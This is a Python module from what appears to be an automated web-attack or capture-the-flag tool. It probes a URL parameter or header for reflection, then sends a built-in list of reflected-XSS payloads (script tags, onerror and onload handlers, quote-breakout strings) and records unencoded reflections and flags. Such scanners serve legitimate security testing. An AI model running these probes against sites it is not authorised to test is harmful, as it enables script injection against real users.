"""
XSS attack module.
Covers: reflected XSS in HTML body, attribute, JS context.
Uses a unique marker to confirm reflection.
"""
from __future__ import annotations
import uuid

from attacks.base import BaseAttack
from engine.flag_hunter import has_definite_flag
from rich.console import Console

console = Console()

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "';alert(1);//",
    '";alert(1);//',
    "<ScRiPt>alert(1)</ScRiPt>",
    "<img src=1 onerror=alert(1)>",
    "<%2fscript><script>alert(1)<%2fscript>",
    "<iframe src=javascript:alert(1)>",
]


class XSSAttack(BaseAttack):
    name = "xss"

    async def run(self, attack_point: dict, payloads: list[str]) -> list[dict]:
        url = attack_point["url"]
        param = attack_point.get("param")
        method = attack_point.get("method", "GET")
        is_header = attack_point.get("input_type") == "header"

        if not param:
            return []

        location = f"header:{param}" if is_header else f"?{param}"
        console.print(f"  [cyan][XSS][/cyan] {method} {url} {location}")

        marker = f"TWEB_{uuid.uuid4().hex[:8]}"
        probe_payload = f"<{marker}>"
        response, _ = await self._try_payload(method, url, param, probe_payload, as_header=is_header)

        if response is None:
            return []

        if marker.lower() not in response.text.lower():
            return []

        console.print(f"  [yellow][XSS][/yellow] Reflection confirmed at {url} {location}")

        all_findings = []
        combined_payloads = (payloads or []) + XSS_PAYLOADS

        for payload in combined_payloads:
            if self._should_stop():
                break

            response, findings = await self._try_payload(
                method, url, param, payload, as_header=is_header
            )
            if response is None:
                continue

            if payload in response.text:
                console.print(f"  [bold red][XSS][/bold red] Unencoded reflection! Payload: {payload!r}")
                all_findings.append({
                    "type": "xss_reflected",
                    "value": f"Reflected XSS @ {url} {location} payload={payload!r}",
                    "confidence": 0.9,
                })
                flag = has_definite_flag(findings)
                if flag:
                    console.print(f"  [bold green][XSS][/bold green] FLAG: {flag}")
                    all_findings.extend([f for f in findings if f.get("confidence", 0) >= 1.0])
                    self.stop_event.set()
                    return all_findings
                break  # İlk başarılı reflection yeterli

        return all_findings
